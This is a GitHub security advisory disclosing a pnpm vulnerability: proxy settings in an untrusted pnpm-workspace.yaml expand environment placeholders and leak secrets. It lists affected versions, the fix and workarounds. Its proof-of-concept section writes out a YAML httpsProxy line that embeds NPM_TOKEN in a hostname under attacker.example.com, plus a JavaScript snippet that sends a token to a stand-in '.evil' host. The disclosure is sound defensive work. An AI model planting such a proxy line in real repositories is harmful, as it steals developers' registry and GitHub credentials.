# [H] pnpm: Environment secrets exfiltrated via env-placeholder expansion in proxy settings read from an untrusted pnpm-workspace.yaml

## Summary
Severity: High
Advisory: GHSA-vx52-2968-3vc6
CWE: CWE-201, CWE-319, CWE-522
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-09-01
Source: https://github.com/advisories/GHSA-vx52-2968-3vc6
Type: github-advisory

## Affected
- npm: `pnpm` — affected >=11.0.0 <11.11.0
- npm: `pnpm` — affected >=10.7.0 <10.34.5

## Details
## Summary

pnpm expands `${VAR}` environment placeholders in the `httpProxy` / `httpsProxy` / `noProxy` settings read from a project's `pnpm-workspace.yaml`. Because a project manifest is repository-controlled, a malicious repository that a victim merely clones and runs `pnpm install` in can route all install traffic through an attacker proxy whose hostname or userinfo embeds — and thereby exfiltrates — an environment secret such as `NPM_TOKEN` or `GITHUB_TOKEN`.

This bypasses a trust boundary pnpm deliberately enforces: env-placeholder expansion of request-destination settings is already suppressed for `registry`, `pnprServer`, `registries` and `namedRegistries` when they come from an untrusted project manifest, and the sibling `.npmrc` reader already classifies the proxy keys as request destinations. The manifest-side guard set simply omitted them.

## Impact

An attacker who controls only the contents of a repository's `pnpm-workspace.yaml` — a public repo, a fork, or a supply-chain pull request — can read many values out of the victim's process environment and have them delivered to an attacker-controlled host. No pre-existing access to the victim's store, global config, lockfile, `node_modules`, or environment is required. The secret is exfiltrated during config loading, before any lifecycle script runs.

This turns "I can author a project manifest" into "I read the victim's environment secrets."

## Affected versions

Introduced in pnpm 10.7.0, which added environment-variable expansion in setting names and values.

- pnpm 11.x: `>= 11.0.0, < 11.11.0`
- pnpm 10.x: `>= 10.7.0, < 10.34.5`

The Rust port (`pacquet`) and the registry server (`pnpr`) are **not** affected.

## Patches

- **pnpm 11.11.0** and later
- **pnpm 10.34.5** and later

The fix adds `httpProxy`, `httpsProxy`, `noProxy`, `proxy` and `noproxy` to the request-destination key set in `@pnpm/config.reader` (`src/getOptionsFromRootManifest.ts`), so env placeholders in proxy settings from an untrusted manifest are dropped rather than expanded — matching the existing `registry` / `pnprServer` handling and the `.npmrc` reader's `isRequestDestinationValueKey`. Regression tests cover the proxy keys.

## Workarounds

Upgrade to a patched version. Until then, do not run pnpm commands in an untrusted repository in an environment that holds secrets, or inspect the repository's `pnpm-workspace.yaml` for proxy settings before installing.

## Proof of concept

```yaml
# pnpm-workspace.yaml in an untrusted repository
packages:
  - .
httpsProxy: "http://${NPM_TOKEN}.collector.attacker.example.com:8080"
```

With `NPM_TOKEN` set in the victim's environment, `pnpm install` expands the placeholder and routes install traffic through the attacker's host, whose hostname (and DNS query) carries the token.

Unit level:

```js
process.env.PNPM_TEST_TOKEN = 'secret'
const o = getOptionsFromPnpmSettings(process.cwd(), { httpsProxy: 'http://${PNPM_TEST_TOKEN}.evil/' })
// Vulnerable: o.httpsProxy === 'http://secret.evil/'
// Patched:    o.httpsProxy === undefined
```

Using `registry` or `pnprServer` in place of `httpsProxy` does not leak on either version — those keys were already guarded, which is what made the proxy keys a hole in an existing boundary rather than an unguarded surface.

## Credit

Reported privately. A second finding in the original report — the `Authorization` header being retained across a same-host `https` -> `http` redirect — was assessed and is **not** treated as a pnpm vulnerability: npm (`make-fetch-happen`, `minipass-fetch`), Yarn (`got`) and reqwest all compare host rather than origin, and a registry that redirects from HTTPS to plaintext HTTP is itself the broken component. That behavior is being discussed publicly at https://github.com/orgs/pnpm/discussions/13598.

## References
- https://github.com/pnpm/pnpm/security/advisories/GHSA-vx52-2968-3vc6
- https://github.com/pnpm/pnpm/pull/12871
- https://github.com/pnpm/pnpm/pull/12898
- https://github.com/pnpm/pnpm/commit/36928beae9afb64a2a6a1221df54e66d361320c8
- https://github.com/pnpm/pnpm/commit/5a4daec4bd5f0170b18ae053aff093eea56368ba
- https://github.com/orgs/pnpm/discussions/13598
- https://github.com/pnpm/pnpm
- https://github.com/pnpm/pnpm/releases/tag/v10.34.5
- https://github.com/pnpm/pnpm/releases/tag/v11.11.0
